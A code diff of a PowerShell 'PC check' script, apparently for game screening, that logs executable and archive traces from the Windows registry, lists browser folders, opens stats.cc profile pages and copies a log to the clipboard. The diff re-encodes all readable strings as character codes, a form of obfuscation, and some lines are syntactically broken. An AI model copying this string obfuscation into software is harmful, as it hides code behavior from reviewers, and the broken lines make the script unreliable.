-        if (($_.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZXhl'))) -or $_.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LnJhcg==')))) -and -not $loggedPaths.ContainsKey($_.Name)) {
+        if (($_.Name -match ([System.Text.Encoding]::UTF8.GetString([byte[]](0x65,0x78,0x65))) -or $_.Name -match "$([char]0x2E)$([char]0x72)$([char]0x61)$([char]0x72)") -and -not $loggedPaths.ContainsKey($_.Name)) {
             Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
             $loggedPaths[$_.Name] = $true
         }
     }
-Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RmV0Y2hpbmcgQXBwc1N3aXRjaGVkIEVudHJpZXM='))) -ForegroundColor Blue
-    
-    $newRegistryPath = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtDVTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcRmVhdHVyZVVzYWdlXEFwcFN3aXRjaGVk')))
+Write-Host "$([char]0x46)$([char]0x65)$([char]0x74)$([char]0x63)$([char]0x68)$([char]0x69)$([char]0x6E)$([char]0x67)$([char]0x20)$([char]0x41)$([char]0x70)$([char]0x70)$([char]0x73)$([char]0x53)$([char]0x77)$([char]0x69)$([char]0x74)$([char]0x63)$([char]0x68)$([char]0x65)$([char]0x64)$([char]0x20)$([char]0x45)$([char]0x6E)$([char]0x74)$([char]0x72)$([char]0x69)$([char]0x65)$([char]0x73)" -ForegroundColor Blue
+    # Log entries from FeatureUsage\AppSwitched
+    $newRegistryPath = (-join([char]0x48, [char]0x4B, [char]0x43, [char]0x55, [char]0x3A, [char]0x5C, [char]0x53, [char]0x4F, [char]0x46, [char]0x54, [char]0x57, [char]0x41, [char]0x52, [char]0x45, [char]0x5C, [char]0x4D, [char]0x69, [char]0x63, [char]0x72, [char]0x6F, [char]0x73, [char]0x6F, [char]0x66, [char]0x74, [char]0x5C, [char]0x57, [char]0x69, [char]0x6E, [char]0x64, [char]0x6F, [char]0x77, [char]0x73, [char]0x5C, [char]0x43, [char]0x75, [char]0x72, [char]0x72, [char]0x65, [char]0x6E, [char]0x74, [char]0x56, [char]0x65, [char]0x72, [char]0x73, [char]0x69, [char]0x6F, [char]0x6E, [char]0x5C, [char]0x45, [char]0x78, [char]0x70, [char]0x6C, [char]0x6F, [char]0x72, [char]0x65, [char]0x72, [char]0x5C, [char]0x46, [char]0x65, [char]0x61, [char]0x74, [char]0x75, [char]0x72, [char]0x65, [char]0x55, [char]0x73, [char]0x61, [char]0x67, [char]0x65, [char]0x5C, [char]0x41, [char]0x70, [char]0x70, [char]0x53, [char]0x77, [char]0x69, [char]0x74, [char]0x63, [char]0x68, [char]0x65, [char]0x64))
     if (Test-Path $newRegistryPath) {
         $newEntries = Get-ItemProperty -Path $newRegistryPath
         $newEntries.PSObject.Properties | ForEach-Object {
-            if (($_.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZXhl'))) -or $_.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LnJhcg==')))) -and -not $loggedPaths.ContainsKey($_.Name)) {
+            if (($_.Name -match "$([char]0x65)$([char]0x78)$([char]0x65)" -or $_.Name -match (-join([char]0x2E, [char]0x72, [char]0x61, [char]0x72))) -and -not $loggedPaths.ContainsKey($_.Name)) {
                 Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
                 $loggedPaths[$_.Name] = $true
             }
         }
     }
-Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RmV0Y2hpbmcgTXVpQ2FjaGUgRW50cmllcw=='))) -ForegroundColor Blue
-    
-    $muiCachePath = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtDUjpcTG9jYWwgU2V0dGluZ3NcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcU2hlbGxcTXVpQ2FjaGU=')))
+Write-Host (-join([char]0x46, [char]0x65, [char]0x74, [char]0x63, [char]0x68, [char]0x69, [char]0x6E, [char]0x67, [char]0x20, [char]0x4D, [char]0x75, [char]0x69, [char]0x43, [char]0x61, [char]0x63, [char]0x68, [char]0x65, [char]0x20, [char]0x45, [char]0x6E, [char]0x74, [char]0x72, [char]0x69, [char]0x65, [char]0x73)) -ForegroundColor Blue
+    # Log entries from MuiCache
+    $muiCachePath = (-join([char]0x48, [char]0x4B, [char]0x43, [char]0x52, [char]0x3A, [char]0x5C, [char]0x4C, [char]0x6F, [char]0x63, [char]0x61, [char]0x6C, [char]0x20, [char]0x53, [char]0x65, [char]0x74, [char]0x74, [char]0x69, [char]0x6E, [char]0x67, [char]0x73, [char]0x5C, [char]0x53, [char]0x6F, [char]0x66, [char]0x74, [char]0x77, [char]0x61, [char]0x72, [char]0x65, [char]0x5C, [char]0x4D, [char]0x69, [char]0x63, [char]0x72, [char]0x6F, [char]0x73, [char]0x6F, [char]0x66, [char]0x74, [char]0x5C, [char]0x57, [char]0x69, [char]0x6E, [char]0x64, [char]0x6F, [char]0x77, [char]0x73, [char]0x5C, [char]0x53, [char]0x68, [char]0x65, [char]0x6C, [char]0x6C, [char]0x5C, [char]0x4D, [char]0x75, [char]0x69, [char]0x43, [char]0x61, [char]0x63, [char]0x68, [char]0x65))
     if (Test-Path $muiCachePath) {
         $muiCacheEntries = Get-ChildItem -Path $muiCachePath
         $muiCacheEntries.PSObject.Properties | ForEach-Object {
-            if (($_.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZXhl'))) -or $_.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LnJhcg==')))) -and -not $loggedPaths.ContainsKey($_.Name)) {
+            if (($_.Name -match (-join([char]0x65, [char]0x78, [char]0x65)) -or $_.Name -match (-join([char]0x2E, [char]0x72, [char]0x61, [char]0x72))) -and -not $loggedPaths.ContainsKey($_.Name)) {
                 Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
                 $loggedPaths[$_.Name] = $true
             }
         }
     }
 
-    Get-Content $outputFile | Sort-Object | Get-Unique | Where-Object { $_ -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XHsuKlx9'))) } | ForEach-Object { $_ -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Og=='))), '' } | Set-Content $outputFile
+    Get-Content $outputFile | Sort-Object | Get-Unique | Where-Object { $_ -notmatch "$([char]0x5C)$([char]0x7B)$([char]0x2E)$([char]0x2A)$([char]0x5C)$([char]0x7D)" } | ForEach-Object { $_ -replace (-join([char]0x3A)), '' } | Set-Content $outputFile
 
     Log-BrowserFolders
-   
+    # Remove the placeholder Log-MUICacheEntries function call if not defined elsewhere
   
     $folderNames = Log-FolderNames | Sort-Object | Get-Unique
-    Add-Content -Path $outputFile -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4tLS0tLS0tLS0tLS0tLS0tLQ==')))
-    Add-Content -Path $outputFile -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG5SNiBVc2VybmFtZXM6')))
+    Add-Content -Path $outputFile -Value ([System.Text.Encoding]::UTF8.GetString([byte[]](0x60,0x6E,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D)))
+    Add-Content -Path $outputFile -Value (-join([char]0x60, [char]0x6E, [char]0x52, [char]0x36, [char]0x20, [char]0x55, [char]0x73, [char]0x65, [char]0x72, [char]0x6E, [char]0x61, [char]0x6D, [char]0x65, [char]0x73, [char]0x3A))
 
     foreach ($name in $folderNames) {
         Add-Content -Path $outputFile -Value $name
-        $url = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9zdGF0cy5jYy9zaWVnZS8='))) + $name)
-        Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('T3BlbmluZyBzdGF0cyBmb3Ig'))) + $name + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IG9uIFN0YXRzLmNjIC4uLg==')))) -ForegroundColor Blue
+        $url = ((-join([char]0x68, [char]0x74, [char]0x74, [char]0x70, [char]0x73, [char]0x3A, [char]0x2F, [char]0x2F, [char]0x73, [char]0x74, [char]0x61, [char]0x74, [char]0x73, [char]0x2E, [char]0x63, [char]0x63, [char]0x2F, [char]0x73, [char]0x69, [char]0x65, [char]0x67, [char]0x65, [char]0x2F)) + $name)
+        Write-Host (([System.Text.Encoding]::UTF8.GetString([byte[]](0x4F,0x70,0x65,0x6E,0x69,0x6E,0x67,0x20,0x73,0x74,0x61,0x74,0x73,0x20,0x66,0x6F,0x72,0x20))) + $name + ([System.Text.Encoding]::UTF8.GetString([byte[]](0x20,0x6F,0x6E,0x20,0x53,0x74,0x61,0x74,0x73,0x2E,0x63,0x63,0x20,0x2E,0x2E,0x2E)))) -ForegroundColor Blue
         Start-Process $url
         Start-Sleep -Seconds 0.5
     }
 }
-Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IEZldGNoaW5nIERvd25sb2FkZWQgQnJvd3NlcnMg'))) -ForegroundColor Blue
+Write-Host (-join([char]0x20, [char]0x46, [char]0x65, [char]0x74, [char]0x63, [char]0x68, [char]0x69, [char]0x6E, [char]0x67, [char]0x20, [char]0x44, [char]0x6F, [char]0x77, [char]0x6E, [char]0x6C, [char]0x6F, [char]0x61, [char]0x64, [char]0x65, [char]0x64, [char]0x20, [char]0x42, [char]0x72, [char]0x6F, [char]0x77, [char]0x73, [char]0x65, [char]0x72, [char]0x73, [char]0x20)) -ForegroundColor Blue
 function Log-BrowserFolders {
-    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9nZ2luZyByZWcgZW50cmllcyBpbnNpZGUgUG93ZXJTaGVsbC4uLg=='))) -ForegroundColor DarkYellow
-    $registryPath = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtMTTpcU09GVFdBUkVcQ2xpZW50c1xTdGFydE1lbnVJbnRlcm5ldA==')))
-    $desktopPath = [System.Environment]::GetFolderPath(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGVza3RvcA=='))))
-    $outputFile = Join-Path -Path $desktopPath -ChildPath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UGNDaGVja0xvZ3MudHh0')))
+    Write-Host (-join([char]0x4C, [char]0x6F, [char]0x67, [char]0x67, [char]0x69, [char]0x6E, [char]0x67, [char]0x20, [char]0x72, [char]0x65, [char]0x67, [char]0x20, [char]0x65, [char]0x6E, [char]0x74, [char]0x72, [char]0x69, [char]0x65, [char]0x73, [char]0x20, [char]0x69, [char]0x6E, [char]0x73, [char]0x69, [char]0x64, [char]0x65, [char]0x20, [char]0x50, [char]0x6F, [char]0x77, [char]0x65, [char]0x72, [char]0x53, [char]0x68, [char]0x65, [char]0x6C, [char]0x6C, [char]0x2E, [char]0x2E, [char]0x2E)) -ForegroundColor DarkYellow
+    $registryPath = ([System.Text.Encoding]::UTF8.GetString([byte[]](0x48,0x4B,0x4C,0x4D,0x3A,0x5C,0x53,0x4F,0x46,0x54,0x57,0x41,0x52,0x45,0x5C,0x43,0x6C,0x69,0x65,0x6E,0x74,0x73,0x5C,0x53,0x74,0x61,0x72,0x74,0x4D,0x65,0x6E,0x75,0x49,0x6E,0x74,0x65,0x72,0x6E,0x65,0x74)))
+    $desktopPath = [System.Environment]::GetFolderPath((-join([char]0x44, [char]0x65, [char]0x73, [char]0x6B, [char]0x74, [char]0x6F, [char]0x70)))
+    $outputFile = Join-Path -Path $desktopPath -ChildPath ([System.Text.Encoding]::UTF8.GetString([byte[]](0x50,0x63,0x43,0x68,0x65,0x63,0x6B,0x4C,0x6F,0x67,0x73,0x2E,0x74,0x78,0x74)))
     if (Test-Path $registryPath) {
         $browserFolders = Get-ChildItem -Path $registryPath
-        Add-Content -Path $outputFile -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4tLS0tLS0tLS0tLS0tLS0tLQ==')))
-        Add-Content -Path $outputFile -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG5Ccm93c2VyIEZvbGRlcnM6')))
+        Add-Content -Path $outputFile -Value ([System.Text.Encoding]::UTF8.GetString([byte[]](0x60,0x6E,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D)))
+        Add-Content -Path $outputFile -Value (-join([char]0x60, [char]0x6E, [char]0x42, [char]0x72, [char]0x6F, [char]0x77, [char]0x73, [char]0x65, [char]0x72, [char]0x20, [char]0x46, [char]0x6F, [char]0x6C, [char]0x64, [char]0x65, [char]0x72, [char]0x73, [char]0x3A))
         foreach ($folder in $browserFolders) { Add-Content -Path $outputFile -Value $folder.Name }
     } else {
-        Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UmVnaXN0cnkgcGF0aCBmb3IgYnJvd3NlcnMgbm90IGZvdW5kLg=='))) -ForegroundColor Red
+        Write-Host "$([char]0x52)$([char]0x65)$([char]0x67)$([char]0x69)$([char]0x73)$([char]0x74)$([char]0x72)$([char]0x79)$([char]0x20)$([char]0x70)$([char]0x61)$([char]0x74)$([char]0x68)$([char]0x20)$([char]0x66)$([char]0x6F)$([char]0x72)$([char]0x20)$([char]0x62)$([char]0x72)$([char]0x6F)$([char]0x77)$([char]0x73)$([char]0x65)$([char]0x72)$([char]0x73)$([char]0x20)$([char]0x6E)$([char]0x6F)$([char]0x74)$([char]0x20)$([char]0x66)$([char]0x6F)$([char]0x75)$([char]0x6E)$([char]0x64)$([char]0x2E)" -ForegroundColor Red
     }
 }
 
 function Log-WindowsInstallDate {
-    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9nZ2luZyBXaW5kb3dzIGluc3RhbGwgZGF0ZS4uLg=='))) -ForegroundColor DarkYellow
+    Write-Host ([System.Text.Encoding]::UTF8.GetString([byte[]](0x4C,0x6F,0x67,0x67,0x69,0x6E,0x67,0x20,0x57,0x69,0x6E,0x64,0x6F,0x77,0x73,0x20,0x69,0x6E,0x73,0x74,0x61,0x6C,0x6C,0x20,0x64,0x61,0x74,0x65,0x2E,0x2E,0x2E))) -ForegroundColor DarkYellow
     $os = Get-WmiObject -Class Win32_OperatingSystem
     $installDate = $os.ConvertToDateTime($os.InstallDate)
-    $desktopPath = [System.Environment]::GetFolderPath(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGVza3RvcA=='))))
-    $outputFile = Join-Path -Path $desktopPath -ChildPath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UGNDaGVja0xvZ3MudHh0')))
-    Add-Content -Path $outputFile -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4tLS0tLS0tLS0tLS0tLS0tLQ==')))
-    Add-Content -Path $outputFile -Value (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG5XaW5kb3dzIEluc3RhbGxhdGlvbiBEYXRlOiA='))) + $installDate)
+    $desktopPath = [System.Environment]::GetFolderPath((-join([char]0x44, [char]0x65, [char]0x73, [char]0x6B, [char]0x74, [char]0x6F, [char]0x70)))
+    $outputFile = Join-Path -Path $desktopPath -ChildPath "$([char]0x50)$([char]0x63)$([char]0x43)$([char]0x68)$([char]0x65)$([char]0x63)$([char]0x6B)$([char]0x4C)$([char]0x6F)$([char]0x67)$([char]0x73)$([char]0x2E)$([char]0x74)$([char]0x78)$([char]0x74)"
+    Add-Content -Path $outputFile -Value "$([char]0x60)$([char]0x6E)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)"
+    Add-Content -Path $outputFile -Value (([System.Text.Encoding]::UTF8.GetString([byte[]](0x60,0x6E,0x57,0x69,0x6E,0x64,0x6F,0x77,0x73,0x20,0x49,0x6E,0x73,0x74,0x61,0x6C,0x6C,0x61,0x74,0x69,0x6F,0x6E,0x20,0x44,0x61,0x74,0x65,0x3A,0x20))) + $installDate)
 }
 
 List-BAMStateUserSettings
@@ -258,26 +258,26 @@ Log-WindowsInstallDate
 Find-RarAndExeFiles
 Find-SusFiles
 
-$desktopPath = [System.Environment]::GetFolderPath(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGVza3RvcA=='))))
-
-$logFilePath = Join-Path -Path $desktopPath -ChildPath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UGNDaGVja0xvZ3MudHh0')))
+$desktopPath = [System.Environment]::GetFolderPath("$([char]0x44)$([char]0x65)$([char]0x73)$([char]0x6B)$([char]0x74)$([char]0x6F)$([char]0x70)")
+# Copy the log file to clipboard
+$logFilePath = Join-Path -Path $desktopPath -ChildPath ([System.Text.Encoding]::UTF8.GetString([byte[]](0x50,0x63,0x43,0x68,0x65,0x63,0x6B,0x4C,0x6F,0x67,0x73,0x2E,0x74,0x78,0x74)))
 
 if (Test-Path $logFilePath) {
     Set-Clipboard -Path $logFilePath
-    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9nIGZpbGUgY29waWVkIHRvIGNsaXBib2FyZC4='))) -ForegroundColor DarkRed
+    Write-Host ([System.Text.Encoding]::UTF8.GetString([byte[]](0x4C,0x6F,0x67,0x20,0x66,0x69,0x6C,0x65,0x20,0x63,0x6F,0x70,0x69,0x65,0x64,0x20,0x74,0x6F,0x20,0x63,0x6C,0x69,0x70,0x62,0x6F,0x61,0x72,0x64,0x2E))) -ForegroundColor DarkRed
 } else {
-    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9nIGZpbGUgbm90IGZvdW5kIG9uIHRoZSBkZXNrdG9wLg=='))) -ForegroundColor Red
+    Write-Host "$([char]0x4C)$([char]0x6F)$([char]0x67)$([char]0x20)$([char]0x66)$([char]0x69)$([char]0x6C)$([char]0x65)$([char]0x20)$([char]0x6E)$([char]0x6F)$([char]0x74)$([char]0x20)$([char]0x66)$([char]0x6F)$([char]0x75)$([char]0x6E)$([char]0x64)$([char]0x20)$([char]0x6F)$([char]0x6E)$([char]0x20)$([char]0x74)$([char]0x68)$([char]0x65)$([char]0x20)$([char]0x64)$([char]0x65)$([char]0x73)$([char]0x6B)$([char]0x74)$([char]0x6F)$([char]0x70)$([char]0x2E)" -ForegroundColor Red
 }
+# Paths to Desktop and Downloads folders
+$desktopPath = [System.Environment]::GetFolderPath("$([char]0x44)$([char]0x65)$([char]0x73)$([char]0x6B)$([char]0x74)$([char]0x6F)$([char]0x70)")
 
-$desktopPath = [System.Environment]::GetFolderPath(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGVza3RvcA=='))))
-
-
+# Get the user's profile folder
 $userProfile = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
 
+# Construct the path to the Downloads folder
+$downloadsPath = Join-Path -Path $userProfile -ChildPath ([System.Text.Encoding]::UTF8.GetString([byte[]](0x44,0x6F,0x77,0x6E,0x6C,0x6F,0x61,0x64,0x73)))
 
-$downloadsPath = Join-Path -Path $userProfile -ChildPath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RG93bmxvYWRz')))
-
-
+# Function to delete a file if it exists
 function Delete-FileIfExists {
     param (
         [string]$filePath
@@ -287,22 +287,22 @@ function Delete-FileIfExists {
     }
 }
 Full paths to the target file in Desktop and Downloads folders
-$targetFileDesktop = Join-Path -Path $desktopPath -ChildPath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UGNDaGVjay50eHQ=')))
-$targetFileDownloads = Join-Path -Path $downloadsPath -ChildPath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UGNDaGVjay50eHQ=')))
+$targetFileDesktop = Join-Path -Path $desktopPath -ChildPath (-join([char]0x50, [char]0x63, [char]0x43, [char]0x68, [char]0x65, [char]0x63, [char]0x6B, [char]0x2E, [char]0x74, [char]0x78, [char]0x74))
+$targetFileDownloads = Join-Path -Path $downloadsPath -ChildPath (-join([char]0x50, [char]0x63, [char]0x43, [char]0x68, [char]0x65, [char]0x63, [char]0x6B, [char]0x2E, [char]0x74, [char]0x78, [char]0x74))
 
-
+# Delete the target file if it exists
 Delete-FileIfExists -filePath $targetFileDesktop
 Delete-FileIfExists -filePath $targetFileDownloads
 
 
 # Define colors
-$yellow = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WWVsbG93')))
-$space = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IA=='))) * 12  
+$yellow = (-join([char]0x59, [char]0x65, [char]0x6C, [char]0x6C, [char]0x6F, [char]0x77))
+$space = ([System.Text.Encoding]::UTF8.GetString([byte[]](0x20))) * 12  # Increased the number of spaces for more right alignment
 
-
-Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4='))) + $space + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('4pWt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pWu')))) -ForegroundColor $yellow
-Write-Host ($space + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('4pSCICAgICAgICAgICAgU0NBTiBDT01QTEVURSAgICAgICAgICAgIOKUgg==')))) -ForegroundColor $yellow
-Write-Host ($space + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('4pWw4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pWv')))) -ForegroundColor $yellow
+# Print the red ([System.Text.Encoding]::UTF8.GetString([byte[]](0x53,0x43,0x41,0x4E,0x20,0x43,0x4F,0x4D,0x50,0x4C,0x45,0x54,0x45))) line with more white space to the right
+Write-Host ((-join([char]0x60, [char]0x6E)) + $space + "$([char]0x256D)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x256E)") -ForegroundColor $yellow
+Write-Host ($space + (-join([char]0x2502, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x53, [char]0x43, [char]0x41, [char]0x4E, [char]0x20, [char]0x43, [char]0x4F, [char]0x4D, [char]0x50, [char]0x4C, [char]0x45, [char]0x54, [char]0x45, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x2502))) -ForegroundColor $yellow
+Write-Host ($space + "$([char]0x2570)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x2500)$([char]0x256F)") -ForegroundColor $yellow
 
 
 
